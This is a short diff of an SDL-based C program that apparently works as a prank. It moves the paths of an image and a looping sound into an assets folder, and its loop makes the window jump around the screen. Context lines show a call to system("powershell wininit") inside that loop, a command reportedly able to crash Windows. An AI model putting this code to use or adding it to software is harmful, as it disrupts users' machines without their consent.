@@ -27,12 +27,12 @@ int main()
   // const SDL_AudioSpec dstspec = {SDL_AUDIO_F32, 2, 48000};
   // SDL_AudioStream *stream = SDL_CreateAudioStream(&srcspec, &dstspec);
 
-  surface = SDL_LoadBMP("fuck.bmp");
+  surface = SDL_LoadBMP("assets/fuck.bmp");
   texture = SDL_CreateTextureFromSurface(renderer, surface);
 
   SDL_DestroySurface(surface);
 
-  PlaySound(TEXT("dur.wav"), NULL, SND_ASYNC | SND_LOOP | SND_FILENAME);
+  PlaySound(TEXT("assets/dur.wav"), NULL, SND_ASYNC | SND_LOOP | SND_FILENAME);
 
   while (true)
   {
@@ -48,11 +48,10 @@ int main()
     {
       SDL_ShowSimpleMessageBox(SDL_MESSAGEBOX_WARNING, "Title", "Message", window);
       system("powershell wininit");
+      // break;
     }
 
     SDL_SetWindowPosition(window, rand() % 1920, rand() % 1080);
-
-    // MessageBeep(0xFFFFFFFF);
 
     SDL_SetRenderDrawColor(renderer, 0, 0, 0, 0);
     SDL_RenderClear(renderer);
